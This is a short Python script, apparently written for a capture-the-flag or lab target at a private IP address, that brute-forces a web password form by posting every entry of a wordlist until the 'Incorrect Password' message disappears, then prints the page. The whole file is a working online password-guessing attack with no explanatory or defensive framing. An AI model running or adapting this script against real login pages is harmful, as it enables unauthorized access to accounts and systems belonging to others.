#!/user/bin/python

import requests
from tqdm import tqdm

url = "http://10.10.100.200:51285/"

wordlist = open("wordlist.txt")
for word in tqdm(wordlist):
    password = word.strip()
    http = requests.post(url, data={'password':password})
    content = http.text
    if ("Incorrect Password" not in content):
        print(content)
        break
